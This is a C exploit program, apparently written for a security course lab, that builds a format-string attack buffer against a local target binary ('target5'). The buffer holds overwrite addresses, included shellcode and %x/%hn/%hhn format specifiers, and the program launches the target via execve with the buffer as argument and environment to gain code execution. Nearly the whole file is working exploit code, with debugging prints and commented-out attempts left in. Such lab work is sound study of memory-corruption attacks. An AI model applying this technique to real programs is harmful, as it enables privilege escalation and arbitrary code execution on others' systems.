#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"

int main(void)
{
	char *args[3];
	char *env[16];
	char attackBuffer[256];
	
	args[0] = TARGET;
	args[1] = attackBuffer;
	//strcpy(attackBuffer, "\x68\xfe\x50\x30"); 
	memcpy(&attackBuffer[0], "\x68\xfe\x50\x30\x00\x00\x00\x00",8); 
	memcpy(&attackBuffer[8], "AAAAAAAA", 8);
	memcpy(&attackBuffer[16], "\x68\xfe\x50\x30\x00\x00\x00\x00", 8);
	memcpy(&attackBuffer[24], "AAAAAAAA", 8);
	memcpy(&attackBuffer[32], "\x69\xfe\x50\x30\x00\x00\x00\x00", 8);
	memcpy(&attackBuffer[40], "AAAAAAAA", 8);
	memcpy(&attackBuffer[48], "\x69\xfe\x50\x30\x00\x00\x00\x00", 8);


	memcpy(&attackBuffer[56], shellcode, 45);
	int i;
	
	for (i = 0; i < 5; i ++){
		memcpy(&attackBuffer[101+2*i], "%x", 2);	
	}
	memcpy(&attackBuffer[111], "%077x", 5);
	memcpy(&attackBuffer[116], "%x", 2);	
	//memcpy(&attackBuffer[118], "%09x", 4);
	memcpy(&attackBuffer[118], "%hn", 3);
	memcpy(&attackBuffer[121], ".", 1);
	memcpy(&attackBuffer[122], "%097x", 5);	
	memcpy(&attackBuffer[127], "%hhn", 4);
	//memcpy(&attackBuffer[127], "%09x", 4);
	//memcpy(&attackBuffer[131], "%54x.", 4);	
	//memcpy(&attackBuffer[135], "%hhn.", 5);
	for (i = 0; i < 10; i ++){
		memcpy(&attackBuffer[131+i], ".", 1);	
	}
	/*for (i = 0; i < 7; i ++){
		memcpy(&attackBuffer[101+5*i], "%x...", 5);	
	}*/
	//strcat(attackBuffer, "%hhn.");
		
        for (i = 0; i < 14; i ++){
		memcpy(&attackBuffer[141+5*i], ".....", 5);	
	}
        for (i = 0; i < 43; i ++){
		memcpy(&attackBuffer[211+i], " ", 1);	
	}
	memcpy(&attackBuffer[255], "\x00", 1);
/*	for (i = 0; i < 21; i ++){
		strcat(attackBuffer, "........");	
	}
	
	
	strcat(attackBuffer, "....");	
*/
	printf("%d\n", strlen(attackBuffer));
	printf("length of 08x: %d\n", strlen("%08x"));
	printf("length of 04x: %d\n", strlen("%04x"));
	printf("length of 050x: %d\n", strlen("%050x"));
	printf("length of x: %d\n", strlen("%x"));
	printf("length of 01x: %d\n", strlen("%01x"));
	printf("length of hhn: %d\n", strlen("%hhn"));
	printf("length of hn: %d\n", strlen("%hn"));
	printf("\n");
	printf("\n");
	printf("\n");
	args[2] = NULL;

	env[0] = &attackBuffer[5];
	env[1] = &attackBuffer[6];
	env[2] = &attackBuffer[7];
	env[3] = &attackBuffer[8];
	env[4] = &attackBuffer[21];
	env[5] = &attackBuffer[22];
	env[6] = &attackBuffer[23];
	env[7] = &attackBuffer[24];
	env[8] = &attackBuffer[37];
	env[9] = &attackBuffer[38];
	env[10] = &attackBuffer[39];
	env[11] = &attackBuffer[40];
	env[12] = &attackBuffer[53];
	env[13] = &attackBuffer[54];
	env[14] = &attackBuffer[55];
	env[15] = &attackBuffer[56];

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
